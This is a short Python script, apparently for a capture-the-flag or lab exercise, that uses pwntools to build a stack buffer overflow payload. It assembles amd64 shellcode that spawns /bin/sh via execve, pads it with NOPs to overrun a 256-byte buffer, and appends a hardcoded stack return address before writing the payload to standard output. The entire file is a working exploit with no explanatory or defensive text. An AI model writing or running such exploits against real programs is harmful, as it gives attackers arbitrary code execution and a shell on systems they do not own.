from pwn import *
import sys

context.arch = "amd64"

shellcode = (
    asm(
        """
    jmp $+18
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    add rax, 59
    syscall
    call $-17
    """
    )
    + b"/bin/sh\x00"
)

filler = asm("nop")
buffer_size = 256
filler_length = buffer_size - len(shellcode)

extra_filler = filler * 8

return_addr = 0x7FFFFFFFDBA0
packed_return_addr = p64(return_addr)

payload = shellcode + (filler * filler_length) + extra_filler + packed_return_addr

sys.stdout.buffer.write(payload)
